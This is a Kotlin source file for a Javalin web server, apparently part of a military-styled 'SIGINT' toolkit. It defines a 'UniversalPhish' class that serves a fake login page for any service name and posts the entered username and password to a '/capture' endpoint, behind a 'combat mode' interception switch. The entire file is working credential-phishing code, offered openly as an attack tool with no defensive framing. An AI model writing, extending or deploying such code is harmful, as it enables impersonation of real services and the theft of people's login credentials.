package com.fardc.sigint.core

import io.javalin.Javalin

class UniversalPhish(private val vault: SecurityVault, private val combatHandler: CombatModeHandler) {
    fun setup(app: Javalin) {
        app.get("/login/{service}") { ctx ->
            val service = ctx.pathParam("service")
            
            // Vérification tactique
            if (!combatHandler.isPassiveInterceptionEnabled()) {
                ctx.status(403).result("STBY_MODE: Interception désactivée.")
                return@get
            }

            println("📡 [SIGINT] Tentative d'accès au service phish: $service")
            ctx.html("""
                <html>
                    <body style="font-family:sans-serif; text-align:center; padding-top:50px;">
                        <h2>Connexion à ${service.uppercase()}</h2>
                        <form action="/capture/${service}" method="post">
                            <input type="text" name="user" placeholder="Identifiant" required><br><br>
                            <input type="password" name="pass" placeholder="Mot de passe" required><br><br>
                            <button type="submit">Se connecter</button>
                        </form>
                    </body>
                </html>
            """.trimIndent())
        }
    }
}
